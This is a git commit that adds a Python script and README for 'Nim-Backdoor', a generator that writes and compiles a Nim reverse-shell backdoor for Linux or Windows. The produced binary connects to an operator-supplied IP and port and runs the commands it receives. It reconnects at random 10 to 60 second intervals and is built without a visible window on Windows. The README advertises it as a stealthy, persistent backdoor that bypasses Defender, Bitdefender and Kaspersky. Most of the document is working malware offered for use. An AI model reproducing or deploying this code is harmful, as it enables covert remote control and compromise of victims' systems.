d6f661fa54298c868996a8d8d45bf02704091bba
Itzcloudyy <nitinsharmahd123@gmail.com>
2024-07-17 14:04:18 +0530

    Happy Hacking

---
+++ Nim-Backdoor.py
@@ -0,0 +1,123 @@
+import os
+import subprocess
+import ipaddress
+import re
+
+def validate_ip(ip):
+    try:
+        ipaddress.ip_address(ip)
+        return True
+    except ValueError:
+        return False
+
+def validate_port(port):
+    return port.isdigit() and 1 <= int(port) <= 65535
+
+def validate_os(os_type):
+    return os_type.lower() in ['linux', 'windows']
+
+def nim_compiler_exists():
+    try:
+        subprocess.run('nim --version', shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
+    except subprocess.CalledProcessError:
+        return False
+
+print("\033[38;2;255;69;172m" + r'''
+    _   ___                 ____             __       __                
+   / | / (_)___ ___        / __ \____ ______/ /______/ /___  ____  _____
+  /  |/ / / __ `__ \______/ __  / __ `/ ___/ //_/ __  / __ \/ __ \/ ___/
+ / /|  / / / / / / /_____/ /_/ / /_/ / /__/ ,< / /_/ / /_/ / /_/ / /    
+/_/ |_/_/_/ /_/ /_/     /_____/\__,_/\___/_/|_|\__,_/\____/\____/_/     
+                                                                        
+                                                  By @malwarekid
+''' + "\033[0m")
+
+ip = input("\033[32mEnter IP address:\033[0m ")
+if not validate_ip(ip):
+    print("\033[31mInvalid IP address.\033[0m")
+    exit(1)
+
+port = input("\033[32mEnter your Port number:\033[0m ")
+if not validate_port(port):
+    print("\033[31mInvalid port number.\033[0m")
+    exit(1)
+
+os_type = input("\033[36mChoose your OS\033[0m (\033[32mlinux\033[0m or \033[34mwindows\033[0m): ")
+if not validate_os(os_type):
+    print("\033[31mInvalid OS type.\033[0m")
+    exit(1)
+
+output_name = input("\033[36mEnter your output file name:\033[0m ")
+if not re.match(r'^[\w\-. ]+$', output_name):
+    print("\033[31mInvalid file name.\033[0m")
+    exit(1)
+
+if not nim_compiler_exists():
+    print("\033[31mNim compiler not found.\033[0m")
+    exit(1)
+
+if os_type.lower() == 'linux':
+    exec_command = 'result = execProcess(c)'
+elif os_type.lower() == 'windows':
+    exec_command = 'result = execProcess("cmd /c " & c)'
+else:
+    print(f"\033[31mUnsupported OS:\033[0m {os_type}")
+    exit(1)
+
+nim_code = f'''
+import net, os, osproc, strutils, random
+
+proc exe(c: string): string =
+  {exec_command}
+
+let address = "{ip}"
+let port = Port({port})
+
+let exitMsg = "\\nExiting Program..."
+
+var sock: Socket
+var userRequestedExit = false
+
+while not userRequestedExit:
+  sock = newSocket()
+  try:
+    sock.connect(address, port)
+
+    while true:
+      sock.send(os.getCurrentDir() & "> ")
+      let cmd = sock.recvLine().strip()
+      if cmd == "exit":
+        sock.send(exitMsg & "\\n")
+        userRequestedExit = true
+        break
+      else:
+        let result = exe(cmd)
+        sock.send(result & "\\n")
+
+  except OSError:
+    if not userRequestedExit:
+      let delay = rand(10000..60000)
+      sleep(delay)
+  finally:
+    sock.close()
+'''
+
+try:
+    with open('program.nim', 'w') as f:
+        f.write(nim_code)
+except Exception as e:
+    print(f"\033[31mError writing to file: {e}\033[0m")
+    exit(1)
+
+if os_type.lower() == 'linux':
+    compile_command = f'nim c -d=release --hints=off --verbosity=0 -o:{output_name} program.nim'
+elif os_type.lower() == 'windows':
+    compile_command = f'nim c -d=mingw -d=release --hints=off --verbosity=0 --app=gui -o:{output_name} program.nim'
+
+try:
+    subprocess.run(compile_command, shell=True, check=True)
+    print(f"\n\033[36mOutput saved as\033[0m \033[31m{output_name}\033[0m")
+    os.remove('program.nim')
+except subprocess.CalledProcessError:
+    print("\033[31mCompilation failed.\033[0m")
---
+++ README.md
@@ -0,0 +1,93 @@
+# Nim-Backdoor
+
+## Overview
+
+The provided Python program, `Nim-Backdoor.py`, generates a Nim program that operates as a backdoor, allowing remote command execution via a netcat-like session. This tool is designed to work on both Linux and Windows systems. Notably, it has been engineered to bypass popular antivirus software such as Microsoft Defender, Bitdefender, and Kaspersky, making it a stealthy solution for maintaining a persistent connection to a target system.
+
+## Dont upload binaries to VIRUSTOTAL!!!
+
+- **Virustotal Results** [Linux](https://www.virustotal.com/gui/file/c8d6cf2495cea4100bb3811e0139dfd85e656eec94fe4607d0a40ea3e66b80d0?nocache=1) & [Windows](https://www.virustotal.com/gui/file/666dabba172a4c910290f8211ad634b909fc85c99d0408aae4c47a67d5596418?nocache=1)
+
+## Features
+
+- **Cross-Platform:** Works on both Linux and Windows systems.
+- **Bypasses Antivirus Detection:** Bypasses Microsoft Defender, Bitdefender, and Kaspersky.
+- **Persistent Connection:** Automatically reconnects if the connection is lost.
+- **Stealthy:** Waits randomly between 10 to 60 seconds before attempting to reconnect.
+- **Command Execution:** Allows remote command execution via a netcat-like session.
+
+## How to Use
+
+1. **Clone the Repository:**
+
+    `git clone https://github.com/malwarekid/Nim-Backdoor.git && cd Nim-Backdoor`
+
+2. **Run the Script:**
+
+    `python3 Nim-Backdoor.py`
+
+```
+python3 Nim-Backdoor.py
+
+    _   ___                 ____             __       __                
+   / | / (_)___ ___        / __ \____ ______/ /______/ /___  ____  _____
+  /  |/ / / __ `__ \______/ __  / __ `/ ___/ //_/ __  / __ \/ __ \/ ___/
+ / /|  / / / / / / /_____/ /_/ / /_/ / /__/ ,< / /_/ / /_/ / /_/ / /    
+/_/ |_/_/_/ /_/ /_/     /_____/\__,_/\___/_/|_|\__,_/\____/\____/_/     
+                                                                        
+                                                  By @malwarekid
+
+Enter IP address: 192.168.1.1
+Enter your Port number: 1234
+Choose your OS (linux or windows): windows
+Enter your output file name: Backdoor
+
+Output saved as Backdoor
+
+```
+
+3. **Enter Input Parameters:**
+
+   - **IP Address:** Enter the IP address for the netcat session.
+   - **Port Number:** Enter the port number for the netcat session.
+   - **OS:** Choose your operating system (Linux or Windows).
+   - **Output File Name:** Enter your desired output file name.
+
+4. **Output Executable:** The script will generate a Nim program and compile it to a binary. The binary will be saved with the name you provided.
+
+## Requirements
+
+- Python 3.6 or above.
+- Nim compiler installed on your system.
+
+## Installation
+
+Ensure you have Python 3.6 or above and the Nim compiler installed on your system.
+
+## Example
+
+`python3 Nim-Backdoor.py`
+
+When prompted, enter the IP address, port number, target OS, and output file name:
+
+```
+Enter IP address: 192.168.1.1
+Enter your Port number: 1234
+Choose your OS (linux or windows): windows
+Enter your output file name: Backdoor
+```
+The script will generate a Nim program and compile it to a binary. The binary will be saved as `Backdoor`.
+
+## Contributors
+
+- [Your Name](https://github.com/malwarekid)
+
+## License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+---
+
+## Notes
+
+Feel free to contribute, report issues, or provide feedback. Don't forget to follow me on [Instagram](https://www.instagram.com/malwarekid/) and [GitHub](https://github.com/malwarekid/). Happy Hacking!
